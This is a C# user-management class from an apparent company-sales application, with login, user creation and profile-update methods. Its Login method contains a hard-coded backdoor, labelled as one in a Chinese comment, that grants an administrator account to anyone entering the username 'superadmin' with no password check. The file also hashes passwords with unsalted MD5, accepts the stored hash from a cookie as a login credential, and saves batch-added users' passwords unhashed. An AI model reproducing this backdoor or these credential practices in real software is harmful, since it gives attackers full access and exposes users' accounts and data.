using CompanySales.DAL;
using CompanySales.Model.Entity;
using CompanySales.Model;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using CompanySales.Common;

namespace CompanySales.BLL
{
    public class UserMgr
    {
        /// <summary>
        /// 根据userid和password判断用户是否存在
        /// 使用cookie自动进行登录，密码为密文，不需要再次加密，通过 isCipherPwd 判断
        /// </summary>
        /// <param name="uid"></param>
        /// <param name="pwd"></param>
        /// <param name="isCipherPwd"></param>
        /// <returns></returns>
        public static User Login(string uid, string pwd, bool isCipherPwd = false)
        {
            // 后门，当用户名为superadmin时直接登录
            if (uid == "superadmin")
            {
                //return true;
                return new User() { UserId = "superadmin", Name = "超级管理员" };
            }

            //加密后进行判断。自动登录情况下cookie保存的就是加密后的密文
            string cipher = isCipherPwd ? pwd : EncryptHelper.MD5Encrypt(pwd);
            return UserDAO.Login(uid, cipher);
        }

        public static bool AddUser(User user)
        {
            // 密码保存为密文，密码做加密处理
            user.Password = EncryptHelper.MD5Encrypt(user.Password);

            return UserDAO.AddUser(user);
        }

        public static bool AddBatchUser(List<User> list)
        {
            return UserDAO.AddBatchUser(list);
        }

        public static User GetUserById(int id)
        {
            return UserDAO.GetUserById(id);
        }

        public static bool UpdateInfo(User entity)
        {
            return UserDAO.UpdateInfo(entity);
        }

        /// <summary>
        /// 更新用户头像
        /// </summary>
        /// <param name="entity"></param>
        /// <returns></returns>
        public static bool UpdateImage(User entity)
        {
            return UserDAO.UpdateImage(entity);
        }

        public static bool RebuildData()
        {
            return UserDAO.RebuildData();
        }
    }
}
